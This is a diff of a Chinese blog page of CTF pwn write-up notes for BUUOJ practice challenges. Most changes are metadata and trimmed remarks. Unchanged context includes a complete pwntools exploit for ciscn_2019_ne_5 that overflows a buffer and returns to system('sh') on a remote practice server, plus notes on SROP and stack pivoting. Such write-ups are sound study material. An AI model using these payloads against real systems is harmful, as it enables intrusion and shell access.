@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      3.7k 字
+      3.6k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      65
+      64
        分钟
     </span>
   
@@ -229,7 +229,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：15 小时前
+                  本文最后更新于：几秒前
                 
               </p>
             
@@ -278,17 +278,13 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pwnlib.util.packing.flat(*a, **kw)<br>- flat(*args, preprocessor = <span class="hljs-literal">None</span>, length = <span class="hljs-literal">None</span>, filler = de_bruijn(), <span class="hljs-comment">#???debruijn是个什么东西</span><br>  word_size = <span class="hljs-literal">None</span>, endianness = <span class="hljs-literal">None</span>, sign = <span class="hljs-literal">None</span>) -&gt; <span class="hljs-built_in">str</span><br></code></pre></td></tr></table></figure></li>
 </ul>
 <h2 id="6-ciscn-2019-n-8"><a href="#6-ciscn-2019-n-8" class="headerlink" title="6.ciscn_2019_n_8"></a>6.ciscn_2019_n_8</h2><ul>
-<li><p>三种方法一应俱全<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bhxdn/p/12679290.html">[0]</a>.</p>
-</li>
-<li><p>还是看别人的才做的出来, 不然谁会知道:</p>
-<ul>
+<li>三种方法一应俱全<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bhxdn/p/12679290.html">[0]</a>.</li>
+<li>还是看别人的才做的出来, 不然谁会知道:<ul>
 <li>get_flag的返回地址不能乱写，打远程时，如果程序是异常退出了，最后是不给你回显的. </li>
 <li>正常退出需要使用exit(), 所以将get_flag的返回地址写成exit的地址</li>
 <li>如果正常退出, 你不加一个p.recv()接受字符, 仍然没有回显.</li>
 <li>还有就是修改bss段的权限, 高级操作, 又得学一个函数**(还没学)**.</li>
 </ul>
-</li>
-<li><p>还是得多看几个writeup, 不过我又想到要是那些没几个人做出来的我岂不是干脆就别做了浪费时间……?</p>
 </li>
 </ul>
 <h2 id="7-not-the-same"><a href="#7-not-the-same" class="headerlink" title="7.not_the_same"></a>7.not_the_same</h2><ul>
@@ -300,7 +296,7 @@
 <h2 id="8-bjdctf-2020-babystack"><a href="#8-bjdctf-2020-babystack" class="headerlink" title="8.bjdctf_2020_babystack"></a>8.bjdctf_2020_babystack</h2><ul>
 <li>比较简单, 主要的问题是context的默认bit是32, 换成万能头的context.binary就没有问题了</li>
 </ul>
-<h2 id="9-ciscn-2019-ne-5"><a href="#9-ciscn-2019-ne-5" class="headerlink" title="9.ciscn_2019_ne_5"></a>9.ciscn_2019_ne_5</h2><p>懒, 要看过程直接找别人的吧<a target="_blank" rel="noopener" href="https://www.freesion.com/article/93161361727/">[0]</a>.</p>
+<h2 id="9-ciscn-2019-ne-5"><a href="#9-ciscn-2019-ne-5" class="headerlink" title="9.ciscn_2019_ne_5"></a>9.ciscn_2019_ne_5</h2><p>过程<a target="_blank" rel="noopener" href="https://www.freesion.com/article/93161361727/">[0]</a>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./ciscn_2019_ne_5&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28273</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_ne_5&quot;</span>)<br><span class="hljs-comment">#思路：先addlog写入128字节的src，下一次循环到getfalg里面用strcpy写入dest实现溢出，返回地址sys，sys返回地址随意，sys参数为sh地址</span><br>elf = ELF(<span class="hljs-string">b&quot;./ciscn_2019_ne_5&quot;</span>, <span class="hljs-number">0</span>)<br>sh = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh&quot;</span>))		<span class="hljs-comment">#可以直接用ELF.search, 或者ROPgadget --binary &quot;&quot; --string &quot;&quot;	</span><br>sys = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>, sh])<br><span class="hljs-comment">#sla(b&#x27;password:&#x27;, b&#x27;administrator&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;1&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;info:&#x27;, payload)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;4&#x27;)</span><br>sl(<span class="hljs-string">b&#x27;administrator&#x27;</span>)				<span class="hljs-comment">#只要搞得清楚, 直接只用sendline(), 只是调试有点乱而已(也还好, 现在的输入也不会太多)</span><br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sl(payload)<br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#sl(b&#x27;administrator\n1\n&#x27;+payload+b&#x27;\n4&#x27;)		甚至可以写成</span><br>itt()<br></code></pre></td></tr></table></figure>
 
 <h2 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10. others_shellcode_"></a>10. others_shellcode_</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">__asm &#123; <span class="hljs-keyword">int</span> <span class="hljs-number">80</span>h; LINUX - sys_execve &#125; <span class="hljs-comment">//tmd这又是哪门子的LINUX</span><br></code></pre></td></tr></table></figure>
@@ -358,8 +354,8 @@
 <p>本题中流程为: 泄露栈基地址-&gt;构造frame = SigreturnFrame()-&gt;填满数组, mov调用号15, syscall地址, bytes(frame)</p>
 </li>
 </ul>
-<h2 id="13-babyheap-0ctf-2017"><a href="#13-babyheap-0ctf-2017" class="headerlink" title="13.babyheap_0ctf_2017"></a>13.babyheap_0ctf_2017</h2><p>巨难的一题heap, 看了老半天源代码和基础知识</p>
-<p>估摸着我得过几天复习复习, 这么辛苦的学习可不能忘记了</p>
+<h2 id="13-babyheap-0ctf-2017"><a href="#13-babyheap-0ctf-2017" class="headerlink" title="13.babyheap_0ctf_2017"></a>13.babyheap_0ctf_2017</h2><p>看了老半天源代码和基础知识</p>
+<p>估摸着我得过几天复习复习, 可不能忘记了</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huzai9527/article/details/114807930?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.base&spm=1001.2101.3001.4242">别人的详细的wp</a>  <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-223461.htm">看雪 不太详细</a> </p>
 <h2 id="14-Black-Watch-入群题-PWN"><a href="#14-Black-Watch-入群题-PWN" class="headerlink" title="14.[Black Watch 入群题]PWN"></a>14.[Black Watch 入群题]PWN</h2><p>又是一种没见过的方法, 名为<strong>栈转移</strong>, 用于栈溢出不够, 以leave ret结尾, 有或能够向bss段写入数据的, 将<strong>rsp</strong>转移到<strong>bss</strong>段</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leave = mov rsp, rbp	 pop rbp    <br>ret =  pop rip<br></code></pre></td></tr></table></figure>
